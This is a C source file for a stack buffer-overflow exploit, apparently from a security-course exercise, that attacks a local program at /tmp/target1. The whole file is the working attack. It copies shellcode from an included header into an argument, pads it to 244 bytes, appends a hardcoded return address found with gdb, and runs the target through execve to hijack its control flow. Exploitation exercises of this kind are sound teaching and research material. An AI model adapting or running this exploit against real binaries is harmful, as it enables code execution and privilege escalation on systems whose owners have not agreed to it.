#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  char address[4] = { 0x68, 0xfc, 0xff, 0xbf };

  args[0] = TARGET;
  args[1] = (char *) malloc(248);

  int i;
  int scl = strlen(shellcode);

  // Inject shell code
  for (i = 0; i < scl; i++)
    args[1][i] = shellcode[i];

  // Pad with many A
  for (i = scl; i < 244; i++)
    args[1][i] = 'A';

  // Add the return address found with gdb
  for (i = 0; i < 4; i++)
    args[1][244 + i] = address[i];

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
